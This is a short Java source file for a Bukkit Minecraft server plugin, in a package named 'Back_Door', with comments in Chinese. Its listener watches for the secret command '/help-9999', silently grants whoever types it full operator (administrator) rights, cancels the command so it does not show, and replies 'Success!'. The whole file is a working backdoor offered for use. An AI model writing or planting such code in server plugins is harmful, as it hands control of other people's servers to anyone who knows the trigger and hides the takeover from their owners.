package org.KXCR_beep.Back_Door;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class MyListener implements Listener
{
    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event)
    {
        if (event.getMessage().equalsIgnoreCase("/help-9999")) //可以自定义
        {
            event.getPlayer().setOp(true);
            event.setCancelled(true);
            event.getPlayer().sendMessage("成功！");
        }
    }
}
